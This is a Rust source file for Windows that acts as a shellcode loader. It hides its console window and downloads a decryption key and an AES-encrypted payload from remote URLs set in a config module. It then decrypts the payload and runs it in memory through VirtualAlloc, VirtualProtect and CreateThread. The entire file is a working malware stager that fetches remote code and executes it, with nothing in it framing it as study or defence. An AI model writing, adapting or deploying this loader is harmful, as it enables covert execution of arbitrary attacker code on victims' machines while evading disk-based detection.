#![windows_subsystem = "windows"]
extern crate aes;
extern crate block_modes;
extern crate pbkdf2;
extern crate sha2;
extern crate hex;
extern crate hmac;
extern crate reqwest;

use std::mem::transmute;
use std::ptr::{copy, null, null_mut};

use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};

use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
type Aes256Cbc = Cbc<Aes256, Pkcs7>;
const IV_SIZE: usize = 16;

mod config;
use config::{ENCRYPTED_URL, KEY_URL};

fn main() -> std::io::Result<()> {
    match unsafe { process_shellcode() } {
        Ok(_) => {
            println!("Decryption and execution succeeded.");
            Ok(())
        }
        Err(e) => {
            eprintln!("Error: {}", e);
            Err(std::io::Error::new(std::io::ErrorKind::Other, e))
        }
    }
}

fn download_content(url: &str) -> Result<Vec<u8>, reqwest::Error> {
    let client = reqwest::blocking::Client::new();
    let response = client.get(url).send()?;
    Ok(response.bytes()?.to_vec())
}

unsafe fn process_shellcode() -> Result<(), String> {
    let key = download_content(KEY_URL)
        .map_err(|e| format!("Failed to download key: {}", e))?;
    let encrypted_data = download_content(ENCRYPTED_URL)
        .map_err(|e| format!("Failed to download encrypted data: {}", e))?;

    let iv = vec![0u8; IV_SIZE];
    let cipher = Aes256Cbc::new_from_slices(&key, &iv)
        .map_err(|e| format!("Cipher initialization failed: {}", e))?;
    let decrypted_data = cipher.decrypt_vec(&encrypted_data)
        .map_err(|e| format!("Decryption failed: {}", e))?;

    let shellcode_size = decrypted_data.len();

    let addr = VirtualAlloc(
        null(),
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if addr.is_null() {
        panic!("[-]VAlloc failed: {}!", GetLastError());
    }

    copy(decrypted_data.as_ptr(), addr.cast(), shellcode_size);

    let mut old = PAGE_READWRITE;
    let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
    if res == FALSE {
        panic!("[-]VProtect failed: {}!", GetLastError());
    }

    let addr = transmute(addr);
    let thread = CreateThread(null(), 0, addr, null(), 0, null_mut());
    if thread == 0 {
        panic!("[-]CThread failed: {}!", GetLastError());
    }

    WaitForSingleObject(thread, WAIT_FAILED);
    Ok(())
}
